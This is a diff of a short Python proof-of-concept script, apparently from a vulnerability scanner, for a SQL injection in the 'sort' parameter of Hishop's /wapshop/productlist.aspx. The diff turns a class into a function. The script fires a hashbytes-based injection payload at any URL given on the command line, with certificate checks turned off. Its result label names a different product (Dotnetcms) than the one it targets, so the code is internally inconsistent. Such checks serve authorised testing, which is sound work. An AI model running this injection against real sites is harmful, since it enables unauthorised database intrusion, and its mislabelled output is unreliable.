@@ -9,17 +9,10 @@ description: Hishop易分销系统/wapshop/productlist.aspx文件中参数sort�
 import sys
 import requests
 import warnings
-
-
-
-class productlist_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['Dotnetcms(风讯cms)SQL注入漏洞','','']
         payload = "/wapshop/productlist.aspx?sort=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)))"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,5 @@ class productlist_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = productlist_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
